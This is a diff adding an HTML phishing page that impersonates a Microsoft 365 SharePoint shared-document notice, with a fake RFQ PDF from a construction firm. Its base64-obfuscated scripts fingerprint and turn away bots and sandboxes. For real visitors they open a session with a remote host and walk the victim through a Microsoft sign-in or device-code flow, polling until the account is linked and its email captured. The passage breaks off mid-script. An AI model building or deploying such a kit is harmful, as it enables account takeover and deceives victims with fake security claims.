@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Microsoft 365 – Shared with you</title>
+  <meta name="application-name" content="Shared document"/>
+  <meta property="og:site_name" content="Microsoft"/>
+  <meta name="theme-color" content="#185abd"/>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(150deg,#e6eff9 0%,#d8e8f5 45%,#e4ecf8 100%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px 16px;color:#1a1918;}
+
+    #_ld{position:fixed;inset:0;background:linear-gradient(150deg,#e6eff9,#d8e8f5);display:flex;align-items:center;justify-content:center;z-index:100;}
+    .ld-spin{width:36px;height:36px;border:3px solid rgba(0,120,212,.18);border-top-color:#185abd;border-radius:50%;animation:spin .8s linear infinite;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+
+    #_mc{width:100%;max-width:480px;}
+
+    .shell{width:100%;background:#fff;border:1px solid #d8e0ea;border-radius:14px;box-shadow:0 4px 12px rgba(0,0,0,.06),0 24px 72px rgba(0,0,0,.13);overflow:hidden;}
+
+    .topbar{display:flex;align-items:center;gap:10px;padding:14px 20px;}
+    .topbar-name{font-size:13px;font-weight:600;color:rgba(255,255,255,.95);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+    .topbar-badge{font-size:10px;font-weight:700;color:rgba(255,255,255,.8);background:rgba(255,255,255,.2);padding:2px 9px;border-radius:20px;white-space:nowrap;flex-shrink:0;letter-spacing:.3px;}
+
+    .notif-card{padding:28px 26px 24px;}
+
+    .card-icon-wrap{width:56px;height:56px;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;}
+    .card-title{font-size:19px;font-weight:700;color:#1a1918;margin-bottom:8px;text-align:center;letter-spacing:-.2px;}
+    .card-sub{font-size:13px;color:#605e5c;margin-bottom:20px;line-height:1.65;text-align:center;}
+
+    .sender-row{display:flex;align-items:center;gap:10px;padding:10px 13px;background:#185abd0c;border-left:3px solid #185abd;border-radius:0 8px 8px 0;margin-bottom:18px;}
+    .s-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;flex-shrink:0;}
+    .s-info{flex:1;min-width:0;}
+    .s-name{font-size:13px;font-weight:600;color:#1a1918;}
+    .s-sub{font-size:12px;color:#8a8886;}
+
+    .cta-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:12px 18px;border:none;border-radius:7px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;letter-spacing:.1px;transition:filter .15s,transform .1s,box-shadow .15s;margin-top:6px;}
+    .cta-btn:hover{filter:brightness(.92);transform:translateY(-1px);}
+    .cta-btn:active{transform:translateY(0);filter:brightness(.88);}
+
+    .secured-note{display:flex;align-items:center;justify-content:center;gap:5px;font-size:11px;color:#a5a5a5;margin-top:13px;}
+
+    .doc-preview-wrap{position:relative;margin-bottom:6px;border-radius:8px;overflow:hidden;}
+    .doc-preview-blur{background:#f8f7f6;border:1px solid #ece9e7;padding:18px 20px;font-size:13px;line-height:1.75;color:#323130;filter:blur(3px);user-select:none;pointer-events:none;max-height:160px;overflow:hidden;}
+    .doc-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(255,255,255,.87);padding:18px;text-align:center;}
+    .lock-circle{width:52px;height:52px;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
+
+    .sp-file-row{display:flex;align-items:center;gap:14px;margin-bottom:14px;padding:14px 16px;background:#f9f8f7;border-radius:10px;border:1px solid #ece9e7;}
+    .sp-file-icon{width:58px;height:58px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden;}
+    .sp-file-info{flex:1;min-width:0;}
+    .sp-file-name{font-size:16px;font-weight:700;color:#1a1918;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .sp-file-meta{font-size:11px;color:#8a8886;margin-top:4px;letter-spacing:.1px;}
+    .lock-banner{display:flex;align-items:center;gap:7px;font-size:12px;color:#0078d4;background:#e8f2ff;padding:8px 12px;border-radius:6px;margin-bottom:14px;font-weight:600;border:1px solid #c8dfff;}
+
+    .tc-visual{background:#185abd09;border:1px solid #185abd1e;border-radius:10px;padding:14px 15px;margin-bottom:4px;}
+    .tc-title{font-size:15px;font-weight:700;color:#1a1918;margin-bottom:6px;line-height:1.3;}
+    .tc-meta{display:flex;align-items:center;gap:7px;font-size:12px;color:#605e5c;}
+
+    .cal-event-wrap{border:1px solid #dde3ec;border-radius:10px;overflow:hidden;margin-bottom:6px;box-shadow:0 1px 4px rgba(0,0,0,.05);}
+    .cal-evt-header{padding:15px 18px;}
+    .cal-evt-body{padding:15px 18px;}
+    .cal-org-row{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding:10px 12px;background:#f5f8ff;border-radius:7px;border:1px solid #185abd14;}
+
+    .rsvp-row{display:flex;gap:8px;}
+    .rsvp-btn{flex:1;padding:8px 4px;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;border:1.5px solid;transition:filter .12s,transform .1s;}
+    .rsvp-btn:hover{filter:brightness(.92);transform:translateY(-1px);}
+    .rsvp-accept{background:#edfaee;border-color:#107c10;color:#107c10;}
+    .rsvp-tentative{background:#fffae6;border-color:#c7a800;color:#7a6400;}
+    .rsvp-decline{background:#feeced;border-color:#d13438;color:#a4262c;}
+
+    .step-list{margin-bottom:16px;}
+    .step-item{display:flex;align-items:flex-start;gap:12px;padding:9px 0;border-bottom:1px solid #f0efee;font-size:13px;color:#323130;line-height:1.55;}
+    .step-item:last-child{border-bottom:none;}
+    .step-num{min-width:26px;height:26px;background:linear-gradient(135deg,#185abd,#0f4a9c);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;flex-shrink:0;box-shadow:0 2px 6px #185abd30;}
+    .step-em{color:#185abd;font-style:normal;font-weight:600;}
+
+    .code-display{background:linear-gradient(135deg,#185abd0a,#185abd05);border:1.5px solid #185abd35;border-radius:10px;padding:16px 18px;display:flex;align-items:center;justify-content:space-between;margin:16px 0;gap:12px;}
+    .code-val{font-size:30px;font-weight:700;letter-spacing:8px;color:#185abd;font-family:'Cascadia Code','Consolas',monospace;}
+    .copy-btn{background:linear-gradient(135deg,#185abd,#0f4a9c);border:none;border-radius:6px;color:#fff;padding:8px 16px;cursor:pointer;font-size:13px;font-weight:600;font-family:inherit;transition:filter .12s,transform .1s;white-space:nowrap;box-shadow:0 2px 8px #185abd30;}
+    .copy-btn:hover{filter:brightness(.9);transform:translateY(-1px);}
+
+    .open-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;background:linear-gradient(135deg,#107c10,#0a5e0a);border:none;border-radius:7px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;text-decoration:none;margin-bottom:12px;transition:filter .12s,transform .1s;box-shadow:0 3px 12px rgba(16,124,16,.3);font-family:inherit;}
+    .open-btn:hover{filter:brightness(.9);transform:translateY(-1px);}
+
+    .status-row{display:flex;align-items:center;gap:10px;font-size:13px;color:#605e5c;margin-bottom:12px;padding:10px 14px;background:#185abd07;border:1px solid #185abd20;border-radius:8px;}
+    .spin-sm{width:15px;height:15px;border:2px solid #e1dfdd;border-top-color:#185abd;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;}
+    .timer{font-size:12px;color:#8a8886;margin-left:auto;font-variant-numeric:tabular-nums;}
+    .timer.expiring{color:#d13438;font-weight:600;}
+
+    .prov-btn{display:flex;align-items:center;gap:12px;width:100%;padding:11px 14px;border-radius:8px;font-size:14px;cursor:pointer;margin-bottom:8px;font-family:inherit;font-weight:600;transition:background .12s,border-color .12s,transform .1s;}
+    .prov-btn:hover{transform:translateY(-1px);}
+    .ms-pbtn{background:#fff;border:1.5px solid #ddd;color:#201f1e;}
+    .ms-pbtn:hover{background:#f5f5f5;border-color:#aaa;}
+    .g-pbtn{background:#fff;border:1.5px solid #ddd;color:#201f1e;}
+    .g-pbtn:hover{background:#f5f5f5;border-color:#aaa;}
+
+    /* ---- Success page ---- */
+    .ok-header{margin:-28px -26px 0;padding:30px 26px 26px;background:linear-gradient(145deg,#0c9b12,#075907);text-align:center;position:relative;overflow:hidden;}
+    .ok-header::before{content:'';position:absolute;top:-40px;right:-40px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,.06);}
+    .ok-header::after{content:'';position:absolute;bottom:-30px;left:-20px;width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.05);}
+    .ok-check-wrap{position:relative;width:72px;height:72px;margin:0 auto 16px;}
+    .ok-pulse{position:absolute;inset:-6px;border-radius:50%;border:2.5px solid rgba(255,255,255,.5);animation:ok-p 1.8s ease-out forwards;opacity:0;animation-delay:.1s;}
+    .ok-pulse2{position:absolute;inset:-14px;border-radius:50%;border:1.5px solid rgba(255,255,255,.22);animation:ok-p 1.8s ease-out forwards;opacity:0;animation-delay:.3s;}
+    @keyframes ok-p{0%{transform:scale(.7);opacity:.9;}100%{transform:scale(1.3);opacity:0;}}
+    .ok-check-circle{width:72px;height:72px;border-radius:50%;background:rgba(255,255,255,.18);border:2.5px solid rgba(255,255,255,.6);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);box-shadow:0 4px 20px rgba(0,0,0,.15);}
+    .ok-h-title{font-size:21px;font-weight:800;color:#fff;margin-bottom:5px;letter-spacing:-.2px;}
+    .ok-h-sub{font-size:13px;color:rgba(255,255,255,.78);line-height:1.5;}
+    .ok-details{padding:20px 0 4px;}
+    .ok-section-lbl{font-size:10px;font-weight:700;color:#8a8886;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;}
+    .ok-row{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #f0efee;}
+    .ok-row:last-child{border-bottom:none;}
+    .ok-row-ico{width:36px;height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .ok-row-txt{flex:1;min-width:0;}
+    .ok-row-lbl{font-size:11px;color:#8a8886;margin-bottom:2px;}
+    .ok-row-val{font-size:13px;font-weight:600;color:#1a1918;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .ok-row-badge{font-size:10px;font-weight:700;color:#107c10;background:#edfaee;border:1px solid #a8e6aa;border-radius:20px;padding:2px 8px;white-space:nowrap;flex-shrink:0;}
+    .ok-footer{margin:16px -26px -24px;padding:14px 20px;background:#f8f9fa;border-top:1px solid #eaeaea;}
+    .err-box{background:#feeced;border:1px solid #f0a9ab;border-radius:7px;padding:10px 14px;color:#a4262c;font-size:13px;margin-top:10px;}
+
+    footer{text-align:center;font-size:11px;color:#a5a5a5;padding:14px 16px 0;}
+
+    @media(max-width:520px){
+      body{padding:16px 12px;}
+      .notif-card{padding:22px 18px 20px;}
+      .card-title{font-size:17px;}
+      .code-val{font-size:24px;letter-spacing:5px;}
+    }
+  </style>
+</head>
+<body>
+<noscript><meta http-equiv="refresh" content="0;url=https://www.microsoft.com"/></noscript>
+
+<div id="_ld"><div class="ld-spin"></div></div>
+
+<div id="_mc" style="display:none;">
+  <div class="shell">
+    <div class="topbar" style="background:linear-gradient(135deg,#185abd,#0f4a9c);"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="rgba(255,255,255,.25)" stroke="#fff" stroke-width="1.5" stroke-linejoin="round"/><path d="M14 2v6h6" stroke="#fff" stroke-width="1.5" stroke-linejoin="round"/><path d="M8 12h8M8 16h5" stroke="#fff" stroke-width="1.5" stroke-linecap="round"/></svg><span class="topbar-name">Shared Document</span></div>
+    <div class="notif-card">
+
+      <div id="_s1">
+        <div class="sender-row"><div class="s-avatar" style="background:#185abd;">G</div><div class="s-info"><div class="s-name">Great Lakesconstructruction</div><div class="s-sub">shared this with you</div></div></div>
+<div class="sp-file-row"><div class="sp-file-icon" style="background:#f5f5f5;border:1px solid #e5e5e5;"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSI1MCIgdmlld0JveD0iMCAwIDQwIDUwIj48cGF0aCBkPSJNNCAwaDIzbDEzIDEzdjM0YTMgMyAwIDAxLTMgM0g0YTMgMyAwIDAxLTMtM1YzYTMgMyAwIDAxMy0zeiIgZmlsbD0iI0Q5MzAyNSIvPjxwYXRoIGQ9Ik0yNyAwbDEzIDEzSDI4YTEgMSAwIDAxLTEtMVYweiIgZmlsbD0iIzlCMUMxNCIvPjx0ZXh0IHg9IjIwIiB5PSIzNiIgZm9udC1mYW1pbHk9IkFyaWFsIEJsYWNrLEFyaWFsIiBmb250LXNpemU9IjEyIiBmb250LXdlaWdodD0iOTAwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgbGV0dGVyLXNwYWNpbmc9IjAuNSI+UERGPC90ZXh0Pjwvc3ZnPg==" width="36" height="36" alt="file" style="display:block;border-radius:4px;" /></div><div class="sp-file-info"><div class="sp-file-name">GreatlakesConstructruction_RFQ_ConcreteSupply_projectDAN_2026-05-11</div><div class="sp-file-meta">Shared Document &middot; Shared for viewing</div></div></div>
+<div class="doc-preview-wrap">
+  <div class="doc-preview-blur"><p><strong>Lorem ipsum dolor sit amet</strong>, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p><p style="margin-top:.7em;">Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur excepteur sint.</p></div>
+  <div class="doc-overlay">
+    <div style="font-size:15px;font-weight:700;color:#1a1918;margin-bottom:5px;">Sign in to view this document</div>
+    <div style="font-size:12px;color:#605e5c;margin-bottom:16px;">Shared Document &middot; Shared for viewing</div>
+    <button class="cta-btn" style="background:linear-gradient(135deg,#185abd,#0f4a9c);box-shadow:0 4px 18px #185abd40;" onclick="selectProvider('microsoft')"><svg width="18" height="18" viewBox="0 0 21 21" style="flex-shrink:0;"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg> Open in SharePoint</button>
+  </div>
+</div>
+<div class="secured-note"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;"><path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.4C17.25 22.15 21 17.25 21 12V7L12 2z" stroke="#185abd" stroke-width="2" stroke-linejoin="round"/></svg> Microsoft OAuth 2.0 &middot; Secured connection</div>
+        
+      </div>
+
+      <div id="_s2" style="display:none;">
+        <div style="display:flex;align-items:center;gap:9px;margin-bottom:5px;"><span style="display:inline-block;width:4px;height:20px;background:linear-gradient(135deg,#185abd,#0f4a9c);border-radius:2px;"></span><span style="font-size:16px;font-weight:700;color:#1a1918;">Verify your identity</span></div>
+        <div id="_sub" style="font-size:13px;color:#605e5c;margin-bottom:18px;line-height:1.55;">Copy the code below and enter it on the Microsoft sign-in page to complete verification.</div>
+        <div class="step-list" id="_steps">
+          <div class="step-item"><div class="step-num">1</div><div>Copy the code below</div></div>
+          <div class="step-item"><div class="step-num">2</div><div>Click <span class="step-em">Open Microsoft sign-in page</span> and enter the code</div></div>
+          <div class="step-item"><div class="step-num">3</div><div>Sign in with your Microsoft account — this page updates automatically</div></div>
+        </div>
+        <div class="code-display" id="_codebox">
+          <span id="_code" class="code-val">——————</span>
+          <button class="copy-btn" id="_copybtn" onclick="_copyCode()">Copy</button>
+        </div>
+        <a id="_openlink" href="#" target="_blank" class="open-btn" onclick="_copyCode()">Open Microsoft sign-in page &#8599;</a>
+        <div class="status-row">
+          <div class="spin-sm"></div>
+          <span>Waiting for verification&hellip;</span>
+          <span class="timer" id="_timer"></span>
+        </div>
+        <div id="_err" class="err-box" style="display:none;"></div>
+      </div>
+
+      <div id="_ok" style="display:none;">
+        <!-- Green header banner -->
+        <div class="ok-header">
+          <div class="ok-check-wrap">
+            <div class="ok-pulse2"></div>
+            <div class="ok-pulse"></div>
+            <div class="ok-check-circle">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </div>
+          </div>
+          <div class="ok-h-title">Access Granted</div>
+          <div class="ok-h-sub" id="_ok_sub">You can now view the shared document.</div>
+        </div>
+
+        <!-- Detail rows -->
+        <div class="ok-details">
+          <div class="ok-section-lbl">Account Details</div>
+
+          <div class="ok-row" id="_ok_badge" style="display:none;">
+            <div class="ok-row-ico" style="background:#edfaee;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" stroke="#107c10" stroke-width="1.8" stroke-linecap="round"/><circle cx="12" cy="7" r="4" stroke="#107c10" stroke-width="1.8"/></svg>
+            </div>
+            <div class="ok-row-txt">
+              <div class="ok-row-lbl">Linked account</div>
+              <div class="ok-row-val" id="_ok_email">—</div>
+            </div>
+            <span class="ok-row-badge">&#10003; Verified</span>
+          </div>
+
+          <div class="ok-row">
+            <div class="ok-row-ico" style="background:#f0f6ff;">
+              <svg width="18" height="18" viewBox="0 0 21 21"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
+            </div>
+            <div class="ok-row-txt">
+              <div class="ok-row-lbl">Sign-in provider</div>
+              <div class="ok-row-val" id="_ok_provider">Microsoft 365</div>
+            </div>
+            <span class="ok-row-badge">&#10003; Active</span>
+          </div>
+
+          <div class="ok-row">
+            <div class="ok-row-ico" style="background:#f5f0ff;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.4C17.25 22.15 21 17.25 21 12V7L12 2z" stroke="#6264a7" stroke-width="1.8" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="#6264a7" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </div>
+            <div class="ok-row-txt">
+              <div class="ok-row-lbl">Authorization</div>
+              <div class="ok-row-val">OAuth 2.0 — Encrypted</div>
+            </div>
+            <span class="ok-row-badge">&#10003; Secure</span>
+          </div>
+
+          <div class="ok-row">
+            <div class="ok-row-ico" style="background:#fff8e6;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#c7a800" stroke-width="1.8"/><path d="M12 7v5l3 3" stroke="#c7a800" stroke-width="1.8" stroke-linecap="round"/></svg>
+            </div>
+            <div class="ok-row-txt">
+              <div class="ok-row-lbl">Time</div>
+              <div class="ok-row-val" id="_ok_time">Just now</div>
+            </div>
+            <span class="ok-row-badge">&#10003; Logged</span>
+          </div>
+        </div>
+
+        <!-- Footer: redirect / close -->
+        <div class="ok-footer">
+          <div id="_ok_rd" style="display:none;align-items:center;gap:9px;font-size:12px;color:#605e5c;">
+            <div class="spin-sm" id="_ok_rd_spin" style="display:none;border-top-color:#107c10;border-color:#d4edda;flex-shrink:0;"></div>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" id="_ok_rd_icon" style="flex-shrink:0;"><path d="M5 12h14M12 5l7 7-7 7" stroke="#107c10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span id="_ok_rd_msg" style="font-weight:500;">You may now close this tab.</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <footer>Microsoft Word Online &middot; microsoft.com &middot; &copy; Microsoft Corporation</footer>
+</div>
+
+<script>(function(){
+var _a=function(s){return atob(s);};
+var _b=navigator,_c=window,_d=document,_w=screen;
+var _t=false;
+if(_b[_a('d2ViZHJpdmVy')]===true)_t=true;
+if(_c[_a('Y2FsbFBoYW50b20=')]||_c[_a('X3BoYW50b20=')])_t=true;
+if(_c[_a('X19uaWdodG1hcmU=')])_t=true;
+if(_d.documentElement.getAttribute(_a('d2ViZHJpdmVy')))_t=true;
+if(_w.width<100||_w.height<100)_t=true;
+if(_b[_a('bGFuZ3VhZ2Vz')]&&_b[_a('bGFuZ3VhZ2Vz')].length===0)_t=true;
+var _isMob=/Mobi|Android|iPhone|iPad|iPod/i.test(_b.userAgent);
+if(!_isMob&&(!_b[_a('cGx1Z2lucw==')]||_b[_a('cGx1Z2lucw==')].length===0))_t=true;
+if(_w.colorDepth<16)_t=true;
+try{
+  var _cv=_d.createElement('canvas');
+  var _gl=_cv.getContext('webgl')||_cv.getContext('experimental-webgl');
+  if(_gl){
+    var _di=_gl.getExtension('WEBGL_debug_renderer_info');
+    if(_di){
+      var _rv=_gl.getParameter(_di.UNMASKED_RENDERER_WEBGL)||'';
+      if(_rv.indexOf(_a('U3dpZnRTaGFkZXI='))>-1||_rv.indexOf(_a('TWVzYQ=='))>-1)_t=true;
+    }
+  }
+}catch(_e2){}
+if(_c.self!==_c.top)_t=true;
+if(_t){try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS93Nk5oOXRmclhvY3lxMG9Odl9pUU1HeGxxeVNHZ0pjQi9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));return;}
+_c._lt=Date.now();
+_c._hg=false;
+var _mh=function(){_c._hg=true;_d.removeEventListener('mousemove',_mh);_d.removeEventListener('touchstart',_mh);};
+_d.addEventListener('mousemove',_mh);
+_d.addEventListener('touchstart',_mh);
+var _mc=_d.getElementById('_mc');
+var _ld=_d.getElementById('_ld');
+if(_mc)_mc.style.display='none';
+setTimeout(function(){
+  if(_mc){
+    _mc.style.opacity='0';
+    _mc.style.transition='opacity 0.4s ease';
+    _mc.style.display='block';
+    setTimeout(function(){_mc.style.opacity='1';},20);
+  }
+  if(_ld)_ld.style.display='none';
+},1400+Math.random()*600);
+var _hp=_d.createElement('div');
+_hp.style.cssText='position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:auto;';
+var _ha=_d.createElement('a');_ha.href='#verify';_ha.textContent='Verify Account';
+_ha.onclick=function(ev){ev.preventDefault();try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS93Nk5oOXRmclhvY3lxMG9Odl9pUU1HeGxxeVNHZ0pjQi9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));};
+_hp.appendChild(_ha);
+var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100);}};_fn();
+})();</script>
+<script>(function(){
+var _d=function(s){return atob(s);};
+var _x0=_d('aHR0cHM6Ly96ZW5ncmlkLnNwYWNl'),_x1=_d('dzZOaDl0ZnJYb2N5cTBvTnZfaVFNR3hscXlTR2dKY0I='),_x2=_d('L2Nvbm5lY3QvcGFnZS8='),_x3=_d('L2luaXQ=');
+var _x4=_d('L2Nvbm5lY3Qvc2Vzc2lvbi8='),_x5=_d('L3N0YXR1cw==');
+var _x6=_d('Q29udGVudC1UeXBl'),_x7=_d('YXBwbGljYXRpb24vanNvbg=='),_x8=_d('UE9TVA==');
+var _x9=_d('cHJvdmlkZXI='),_xa=_d('dXNlcl9jb2Rl'),_xb=_d('dmVyaWZpY2F0aW9uX3VyaQ=='),_xc=_d('c2Vzc2lvbl90b2tlbg=='),_xd=_d('YXBwX2V4cGlyZXNfYXQ=');
+var _xe=_d('Y29ubmVjdGVk'),_xf=_d('ZXhwaXJlZA=='),_xg=_d('Y2FuY2VsbGVk');
+var _sess=null,_poll=null,_cdown=null,_exp=null,_noted=false;
+
+function _gel(id){return document.getElementById(id);}
+function _show(id){_gel(id).style.display='block';}
+function _hide(id){_gel(id).style.display='none';}
+
+function _stopT(){
+  if(_poll){clearInterval(_poll);_poll=null;}
+  if(_cdown){clearInterval(_cdown);_cdown=null;}
+}
+
+function _countdown(){
+  var el=_gel('_timer');
+  function _tick(){
+    var diff=Math.max(0,Math.floor((_exp-Date.now())/1000));
+    var m=String(Math.floor(diff/60)).padStart(2,'0');
+    var s=String(diff%60).padStart(2,'0');
+    if(el)el.textContent=diff>0?'Expires in '+m+':'+s:'Expired';
+    if(el)el.className='timer'+(diff<60?' expiring':'');
+    if(diff===0)clearInterval(_cdown);
+  }
+  _tick();
+  _cdown=setInterval(_tick,1000);
+}
+
+function _startPoll(iv){
+  _poll=setInterval(async function(){
+    if(!_sess)return;
+    try{
+      var r=await fetch(_x0+_x4+_sess+_x5);
+      if(!r.ok)return;
+      var data=await r.json();
+      if(data[_xe]===_xe||data['status']===_xe){
+        _stopT();
+        var sd=_gel('_ok_sub');if(sd)sd.textContent='Your account has been linked successfully.';
+        if(data['email']){var eb2=_gel('_ok_badge');var et=_gel('_ok_email');if(et)et.textContent=data['email'];if(eb2)eb2.style.display='flex';}
+        if(data['provider']){var pv=_gel('_ok_provider');if(pv)pv.textContent=data['provider']==='google'?'Google / Gmail':'Microsoft 365';}
+        var ot=_gel('_ok_time');if(ot){var now=new Date();ot.textContent=now.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'})+' — '+now.toLocaleDateString([],{month:'short',day:'numeric',year:'numeric'});}
+        _hide('_s2');_show('_ok');
+        _doRedirect();
+        setTimeout(function(){var rd=_gel('_ok_rd');if(rd&&rd.style.display==='none')rd.style.display='flex';},1200);
+      }else if(data['status']===_xf||data['status']===_xg){
+        _stopT();
+        var eb=_gel('_err');
+        if(eb){eb.textContent='Session expired. Please try again.';_show('_err');}
+        setTimeout(function(){_hide('_s2');_show('_s1');if(eb)_hide('_err');},2500);
+      }
+    }catch(e){}
+  },iv*1000);
+}
+
+window.selectProvider=function(p){
+  if(!window._hg||(Date.now()-window._lt)<800){return;}
+  _hide('_s1');
+  _gel('_provsel')&&(_gel('_provsel').style.display='none');
+  var codeEl=_gel('_code');
+  var linkEl=_gel('_openlink');
+  var cdEl=_gel('_codebox');
+  var sl=_gel('_steps');
+  var subEl=_gel('_sub');
+  if(_gel('_err'))_hide('_err');
+  _stopT();_noted=false;
+  var _ms_s='<div class="step-item"><div class="step-num">1</div><div class="step-text">Click <span class="step-em">Sign in with Microsoft</span> below</div></div><div class="step-item"><div class="step-num">2</div><div class="step-text">Complete sign-in on the Microsoft page that opens</div></div><div class="step-item"><div class="step-num">3</div><div class="step-text">Return here — your account will be confirmed automatically</div></div>';
+  var _dc_s='<div class="step-item"><div class="step-num">1</div><div>Copy the code below</div></div><div class="step-item"><div class="step-num">2</div><div>Click <span class="step-em">Open sign-in page</span> and enter the code</div></div><div class="step-item"><div class="step-num">3</div><div>Sign in with your account — this page updates automatically</div></div>';
+  if(p==='microsoft'){
+    if(sl)sl.innerHTML=_ms_s;
+    if(subEl)subEl.textContent='Click the button below to sign in securely with your Microsoft account.';
+    if(cdEl)cdEl.style.display='none';
+    if(linkEl){linkEl.textContent='Sign in with Microsoft ↗';linkEl.href='#';linkEl.style.opacity='0.5';linkEl.style.pointerEvents='none';}
+  }else{
+    if(sl)sl.innerHTML=_dc_s;
+    if(subEl)subEl.textContent='Copy the code below and enter it on the sign-in page to complete verification.';
+    if(cdEl)cdEl.style.display='';
+    if(codeEl)codeEl.textContent='Loading…';
+    if(linkEl){linkEl.textContent='Open sign-in page ↗';linkEl.href='#';linkEl.style.opacity='';linkEl.style.pointerEvents='';}
+  }
+  _show('_s2');
+  var hd={};hd[_x6]=_x7;
+  var bd={};bd[_x9]=p;if(window._rcpt)bd['recipient_email']=window._rcpt;
+  fetch(_x0+_x2+_x1+_x3,{method:_x8,headers:hd,body:JSON.stringify(bd)})
+    .then(function(r){if(!r.ok)throw new Error();return r.json();})
+    .then(function(data){
+      _sess=data[_xc];
+      _exp=new Date(data[_xd]);
+      if(data['auth_url']){
+        if(linkEl){linkEl.href=data['auth_url'];linkEl.style.opacity='';linkEl.style.pointerEvents='';}
+        _countdown();_startPoll(3);
+      }else if(data[_xa]){
